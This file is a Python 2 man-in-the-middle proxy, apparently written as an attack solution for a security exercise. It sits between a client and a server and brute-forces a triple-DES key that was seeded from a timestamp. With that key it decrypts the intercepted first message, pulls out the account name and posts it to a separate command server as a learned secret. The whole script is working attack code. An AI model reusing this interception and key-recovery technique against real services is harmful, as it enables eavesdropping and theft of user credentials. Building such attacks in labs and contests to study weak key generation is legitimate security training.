#!/usr/bin/env python2
from __future__ import print_function
import traceback
import random
import socket
import argparse
import threading
import signal
import json
import requests
import sys
import time
from Queue import Queue
from Queue import LifoQueue
from contextlib import contextmanager
from tripleDES import triple_des

running = True
verbose = True

CLIENT2SERVER = 1
SERVER2CLIENT = 2
ctrC2S =0
ctrS2C = 0
timestamp = 0
key = ''
rand = 0
seed = 0
r = ''
addr = ''
DES = ''
message = ''
user = []
done = 0
name = ''
first = ''

def log( m):
  print( m, file=sys.stderr)

def finish():
  global name
  addr = "http://" + "127.0.0.1" + ":" + "5000"
  r = requests.post(addr, data = {'REQUEST': json.dumps({
    "type": "learned",
    "variable": "account",
    "secret": name})})
  r = requests.post( addr, data = {'REQUEST':json.dumps({"type": "done"})})

def getname(buff):
  global seed
  global user
  global name
  global ctrS2C
  global done
  for i in range(150):
    seed = seed - 1
    rand = random.seed(seed)
    key = str(int(round(random.random() * (10**24))))
    try:
      DES = triple_des(key, 1, "\0\0\0\0\0\0\0\0")
      message = DES.decrypt(buff).strip('$')
      if message[-10:] == "0xDEADBEEF": 
        message1 = message[:-110]
        user = message.split(":")
        name = user[0]
        done = 1
        #break
      elif message[-10:] == "0xAardvark":
        message1 = message[:-110]
        user = message1.split('"')
        name = user[-2]
        done = 1
    except:
      pass
  return
  
def mitm(buff, direction, shared):
  global timestamp
  global ctrS2C
  global user
  global done
  global seed
  global first
  
  """
  YOUR ATTACK GOES HERE
  """
  hb = "".join("{:02x}".format(ord(c)) for c in buff)
  # hb = buff
  if direction == CLIENT2SERVER:
    if ctrS2C == 0:
      seed = timestamp - 7000
      first = buff[:]
    # decrypt message
    if done != 1:
      getname(first)
  elif direction == SERVER2CLIENT:
    ctrS2C = ctrS2C + 1
  return buff
  #return "".join([ i if random.choice([True,False]) == True else '' for i in buff ])
  #return "".join([ chr(ord(i) ^ 0x20) if ord(i) >= 0x41 and ord(i) <= 0x71 else i for i in buff])

@contextmanager
def ignored(*exceptions):
  try:
    yield
  except exceptions:
    pass 

def killp(a, b):
  with ignored(Exception):
    a.shutdown(socket.SHUT_RDWR)
    a.close()
    b.shutdown(socket.SHUT_RDWR)
    b.close()
  return

def worker(client, server, n, shared):
  global done
  while running == True:
    b = ""
    with ignored(Exception):
      b = client.recv(4096)
    if len(b) == 0:
      killp(client,server)
      return
    try:
      b = mitm(b,n, shared)
    except:
      pass
    try:
      server.send(b)
      if done == 1:
        finish()
    except:
      killp(client,server)
      return
  killp(client,server)
  return

def signalhandler(sn, sf):
  global running
  running = False

def doProxyMain(port, remotehost, remoteport):
  global timestamp
  precision = 10000
  timestamp = int(round(time.time() * precision))
  signal.signal(signal.SIGTERM, signalhandler)
  try:
    shared = Queue()
    p = threading.Thread(target=sendInput, args=(args.c, args.d,shared))
    p.start()
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind(("0.0.0.0", port))
    s.listen(1)
    workers = []
    print("started")
    sys.stdout.flush()
    while running == True:
      k,a = s.accept()
      v = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
      v.connect((remotehost, remoteport))
      t1 = threading.Thread(target=worker, args=(k,v,CLIENT2SERVER, shared))
      t2 = threading.Thread(target=worker, args=(v,k,SERVER2CLIENT, shared))
      t2.start()
      t1.start()
      workers.append((t1,t2,k,v))
  except Exception:
    signalhandler(None, None)
  # log("********exiting1*******")
  for t1,t2,k,v in workers:
    killp(k,v)
    t1.join()
    t2.join()
  # log("********exiting2*******")
  p.join()
  # log("********exiting3*******")
  return

def sendInput( host, port, shared):
  global running
  while running:
    # log("********GETTING******* %s" % str(running))
    try:
      d = shared.get( block=True, timeout = 1)
      time.sleep(1)
      # log("got: %s" % str(d))
      r = requests.post( "http://"+host+":"+str(port), data = {'REQUEST':json.dumps(d)})
      log( r.text)
    except:
      time.sleep(1)
      # log("********next*******")
      pass

if __name__ == '__main__':
  parser = argparse.ArgumentParser(description='Proxy')
  parser.add_argument('-p', type=int, default=4000, help="listen port")
  parser.add_argument('-s', type=str, default="127.0.0.1", help="server ip address")
  parser.add_argument('-q', type=int, default=3000, help="server port")
  parser.add_argument('-c', type=str, default="127.0.0.1", help="command server")
  parser.add_argument('-d', type=int, default=5000, help="command port")
  args = parser.parse_args()
  doProxyMain(args.p, args.s, args.q)

